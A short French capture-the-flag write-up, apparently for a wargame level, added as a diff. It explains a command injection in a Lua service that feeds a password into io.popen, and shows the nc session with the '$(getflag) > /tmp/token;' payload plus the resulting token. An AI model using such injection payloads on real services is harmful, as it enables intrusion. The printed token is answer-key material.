@@ -1,0 +1,19 @@
+Un script lua est present dans le home avec l'uid de flag11
+
+Il écoute sur le port 5151
+
+Il attend un mot de passe, le compare avec un hash et affiche un message en fonction du résultat
+
+le hash peut être facilement reverse mais ne nous apporte rien
+
+Il est cependant possible d'infecter une commande a cause de l'utilisation de cette ligne: io.popen("echo "..pass.." | sha1sum", "r")
+
+On essaye donc de se connecter au serveur avec nc et de lui injecter un getflag:
+
+~$ nc 127.0.0.1 5151
+Password: ‘$(getflag) > /tmp/token;’
+Erf nope..
+~$ cat /tmp/token
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+Token: fa6v5ateaw21peobuub8ipe6s 
